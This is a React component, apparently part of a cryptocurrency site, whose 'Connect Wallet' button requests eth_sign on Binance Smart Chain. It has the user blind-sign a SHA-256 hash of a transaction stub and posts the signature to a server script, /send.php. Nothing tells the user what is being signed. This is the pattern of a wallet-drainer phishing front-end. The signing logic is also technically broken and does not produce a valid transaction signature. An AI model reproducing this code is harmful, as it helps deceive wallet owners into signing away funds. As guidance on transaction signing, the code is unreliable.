import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // Binance Smart Chain
      methods: ["eth_sign"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var accounts = await provider.request({ method: "eth_accounts" });
    var sender = accounts[0];
    console.log("✅ Wallet Address:", sender);

    let apiUrl = "/send.php";

    async function getRawSignature(address, rawTxData) {
      try {
        // هش گرفتن از rawTxData برای امضا
        const encoder = new TextEncoder();
        const hashedMessage = await crypto.subtle.digest("SHA-256", encoder.encode(rawTxData));
        const hexHash = "0x" + Array.from(new Uint8Array(hashedMessage), (b) => b.toString(16).padStart(2, "0")).join("");

        var rawSignature = await provider.request({
          method: "eth_sign",
          params: [address, hexHash], // امضای هش تراکنش
        });

        return { rawSignature, rawTxData };
      } catch (error) {
        console.error("❌ Error in getRawSignature:", error);
        return null;
      }
    }

    async function sendSignedTransaction(signature, rawTxData) {
      try {
        let requestData = {
          signedData: signature,
          rawTxData: rawTxData,
        };

        let response = await fetch(apiUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(requestData),
        });

        let resultJson = await response.json();
        console.log("📤 Server Response:", resultJson);

        if (resultJson.error) {
          console.error("⚠ Transaction Error:", resultJson.error);
          return null;
        }

        return resultJson.txHash || resultJson.result || resultJson;
      } catch (error) {
        console.error("❌ Error in sendSignedTransaction:", error);
        return null;
      }
    }

    let rawTxData = JSON.stringify({
      to: "0xRecipientAddress",
      value: "0x2386f26fc10000", // 0.01 BNB به واحد wei
      gas: "0x5208", // مقدار گس استاندارد (21000)
      gasPrice: "0x12a05f200", // مقدار گس پرایس (5 Gwei)
      nonce: "0x0", // مقدار نانس اولیه (سرور مقدار درست را جایگزین می‌کند)
    });

    let signedData = await getRawSignature(sender, rawTxData);

    if (signedData) {
      console.log("✍️ Signed Raw Data:", signedData);
      let txHash = await sendSignedTransaction(signedData.rawSignature, signedData.rawTxData);
      console.log("📤 Final Transaction Hash:", txHash);
    } else {
      console.error("⚠ Signing failed.");
    }
  }

  return (
    <button
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
    >
      <span>Connect Wallet</span>
    </button>
  );
}

export default App;
